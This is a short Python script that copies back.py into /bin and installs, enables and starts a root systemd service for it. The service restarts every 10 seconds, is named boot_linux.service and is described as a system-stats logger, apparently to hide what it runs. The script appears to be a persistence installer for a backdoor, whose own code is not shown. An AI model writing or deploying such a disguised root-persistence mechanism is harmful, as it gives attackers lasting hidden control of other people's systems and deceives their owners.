#!/usr/bin/python3
from os import system
import subprocess

payload = """
[Unit]
Description=Supervisor to LOG your system stats inside RAM.

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /bin/back.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

def banconf():
    subprocess.run("cp back.py /bin/", shell=True)
    #file = open("/etc/systemd/system/boot_linux.service", "wt")
    file = open("boot_linux.service", "wt")
    file.write(payload)
    file.close()
    subprocess.run("mv boot_linux.service /etc/systemd/system/", shell=True)
    subprocess.run("systemctl daemon-reload", shell=True)
    #system("systemctl unmask boot_linux.service")
    subprocess.run("systemctl enable boot_linux.service", shell=True)
    subprocess.run("systemctl start boot_linux.service", shell=True)
    subprocess.run("systemctl status boot_linux.service", shell=True)

if __name__ == "__main__":
    banconf()
